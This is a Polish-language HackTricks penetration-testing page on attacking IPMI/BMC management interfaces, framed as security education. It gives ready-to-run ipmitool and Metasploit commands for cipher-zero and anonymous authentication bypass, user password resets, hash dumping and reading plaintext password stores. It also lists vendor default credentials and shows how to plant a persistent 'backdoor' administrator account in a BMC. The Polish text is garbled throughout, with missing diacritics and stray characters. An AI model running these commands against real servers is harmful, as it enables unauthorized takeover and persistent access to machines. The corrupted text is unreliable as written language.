# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

### **Przegld IPMI**

**[Intelligent Platform Management Interface (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)** oferuje standaryzowane podejcie do zdalnego zarzdzania i monitorowania system贸w komputerowych, niezale偶nie od systemu operacyjnego lub stanu zasilania. Ta technologia umo偶liwia administratorom system贸w zdalne zarzdzanie systemami, nawet gdy s wyczone lub nieodpowiedzialne, i jest szczeg贸lnie przydatna do:

- Konfiguracji przed uruchomieniem systemu operacyjnego
- Zarzdzanie wyczaniem zasilania
- Przywracanie po awariach systemu

IPMI jest zdolne do monitorowania temperatur, napi, prdkoci wentylator贸w i zasilaczy, a tak偶e dostarczania informacji o inwentarzu, przegldania dziennik贸w sprztu i wysyania alert贸w za pomoc SNMP. Do jego dziaania niezbdne s 藕r贸do zasilania i poczenie LAN.

Od wprowadzenia przez Intel w 1998 roku, IPMI jest obsugiwane przez licznych dostawc贸w, zwikszajc zdolnoci zdalnego zarzdzania, zwaszcza dziki wsparciu wersji 2.0 dla transmisji szeregowej przez LAN. Kluczowe komponenty obejmuj:

- **Kontroler zarzdzania pyt g贸wn (BMC):** G贸wny mikrokontroler do operacji IPMI.
- **Magistrale i interfejsy komunikacyjne:** Do komunikacji wewntrznej i zewntrznej, w tym ICMB, IPMB i r贸偶ne interfejsy do pocze lokalnych i sieciowych.
- **Pami IPMI:** Do przechowywania dziennik贸w i danych.

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**Domylny port**: 623/UDP/TCP (Zazwyczaj dziaa na UDP, ale mo偶e r贸wnie偶 dziaa na TCP)

## Wyliczanie

### Odkrywanie
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
Mo偶esz **zidentyfikowa** wersj u偶ywajc:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### Podatnoci IPMI

W dziedzinie IPMI 2.0 odkryto znaczc luk w zabezpieczeniach, odkryt przez Dana Farmera, kt贸ra ujawnia podatno poprzez **typ szyfrowania 0**. Ta podatno, szczeg贸owo udokumentowana w badaniach [Dana Farmera](http://fish2.com/ipmi/cipherzero.html), umo偶liwia nieautoryzowany dostp przy u偶yciu dowolnego hasa, pod warunkiem, 偶e jest to wa偶ny u偶ytkownik. Ta sabo zostaa znaleziona w r贸偶nych BMC od producent贸w takich jak HP, Dell i Supermicro, co sugeruje powszechny problem we wszystkich implementacjach IPMI 2.0.

### **Ominicie uwierzytelniania IPMI za pomoc szyfrowania 0**

Aby wykry t luk, mo偶na u偶y nastpujcego skanera pomocniczego w narzdziu Metasploit:
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
Eksploatacja tej luki jest mo偶liwa za pomoc `ipmitool`, jak pokazano poni偶ej, umo偶liwiajc listowanie i modyfikacj hase u偶ytkownik贸w:
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **IPMI 2.0 RAKP - Pobieranie zdalnego hasha hasa uwierzytelniania**

Ta podatno umo偶liwia pobieranie solonych zahaszowanych hase (MD5 i SHA1) dla dowolnej istniejcej nazwy u偶ytkownika. Aby przetestowa t podatno, Metasploit oferuje modu:
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **Anonimowa autoryzacja IPMI**

Domylna konfiguracja wielu BMC (zarzdzanie baz danych) umo偶liwia dostp "anonimowy", charakteryzujcy si pustymi cigami znak贸w dla nazwy u偶ytkownika i hasa. Konfiguracja ta mo偶e by wykorzystana do resetowania hase dla nazwanych kont u偶ytkownik贸w za pomoc narzdzia `ipmitool`:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMI Hasa w czystym tekcie**

Krytyczny wyb贸r projektowy w IPMI 2.0 wymaga przechowywania hase w czystym tekcie w BMC w celu uwierzytelniania. Przechowywanie tych hase przez Supermicro w lokalizacjach takich jak `/nv/PSBlock` lub `/nv/PSStore` rodzi powa偶ne obawy dotyczce bezpieczestwa:
```bash
cat /nv/PSBlock
```
### **Podatno UPnP Supermicro IPMI**

Wczenie przez Supermicro nasuchiwania UPnP SSDP w oprogramowaniu IPMI, zwaszcza na porcie UDP 1900, wprowadza powa偶ne ryzyko bezpieczestwa. Podatnoci w wersji 1.3.1 Intel SDK for UPnP Devices, jak szczeg贸owo opisano w [publikacji Rapid7](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play), umo偶liwiaj uzyskanie dostpu do BMC jako root:
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

**HP losuje losowe haso domylne** dla swojego produktu **Integrated Lights Out (iLO)** podczas produkcji. Praktyka ta r贸偶ni si od innych producent贸w, kt贸rzy zwykle u偶ywaj **statycznych danych uwierzytelniajcych domylnych**. Poni偶ej przedstawiono podsumowanie domylnych nazw u偶ytkownik贸w i hase dla r贸偶nych produkt贸w:

- **HP Integrated Lights Out (iLO)** u偶ywa **losowego cigu 8 znak贸w** jako hasa domylnego, co wiadczy o wy偶szym poziomie bezpieczestwa.
- Produkty takie jak **iDRAC firmy Dell, IMM firmy IBM** i **Integrated Remote Management Controller firmy Fujitsu** u偶ywaj atwo odgadnialnych hase, takich jak "calvin", "PASSW0RD" (z zerem) i "admin" odpowiednio.
- Podobnie, **Supermicro IPMI (2.0), Oracle/Sun ILOM** i **ASUS iKVM BMC** r贸wnie偶 u偶ywaj prostych danych uwierzytelniajcych domylnych, gdzie hasami s "ADMIN", "changeme" i "admin".


## Dostp do hosta za porednictwem BMC

Administracyjny dostp do kontrolera zarzdzania pyt g贸wn (BMC) otwiera r贸偶ne cie偶ki dostpu do systemu operacyjnego hosta. Prostym podejciem jest wykorzystanie funkcjonalnoci klawiatury, wideo i myszy (KVM) BMC. Mo偶na to zrobi poprzez ponowne uruchomienie hosta do powoki roota za pomoc GRUB (u偶ywajc `init=/bin/sh`) lub uruchomienie z wirtualnego napdu CD-ROM jako dysku ratunkowego. Takie metody umo偶liwiaj bezporedni manipulacj dyskiem hosta, wcznie z wstawianiem tylnych drzwi, wydobyciem danych lub wykonaniem innych niezbdnych dziaa w celu oceny bezpieczestwa. Jednak wymaga to ponownego uruchomienia hosta, co stanowi znaczc wad. Bez ponownego uruchamiania dostp do dziaajcego hosta jest bardziej skomplikowany i r贸偶ni si w zale偶noci od konfiguracji hosta. Jeli fizyczna lub konsola szeregowa hosta pozostaje zalogowana, mo偶na j atwo przej za pomoc funkcji KVM lub serial-over-LAN (sol) BMC za pomoc `ipmitool`. Badanie wykorzystania wsp贸dzielonych zasob贸w sprztowych, takich jak magistrala i2c i ukad Super I/O, to obszar, kt贸ry wymaga dalszych bada.

## Wprowadzanie tylnych drzwi do BMC z hosta

Po skompromitowaniu hosta wyposa偶onego w BMC, mo偶na wykorzysta **lokalny interfejs BMC do wstawienia konta u偶ytkownika z tylnymi drzwiami**, tworzc trwa obecno na serwerze. Atak ten wymaga obecnoci narzdzia **`ipmitool`** na skompromitowanym hocie oraz aktywacji obsugi sterownika BMC. Poni偶sze polecenia ilustruj, jak nowe konto u偶ytkownika mo偶na wstrzykn do BMC za pomoc lokalnego interfejsu hosta, omijajc konieczno uwierzytelniania. Ta technika jest zastosowalna w szerokim zakresie system贸w operacyjnych, w tym Linux, Windows, BSD, a nawet DOS.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## Odnoniki

* [https://blog.rapid7.com/2013/07/02/przewodnik-testera-penetracyjnego-po-ipmi/](https://blog.rapid7.com/2013/07/02/przewodnik-testera-penetracyjnego-po-ipmi/)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy **reklam swojej firmy w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
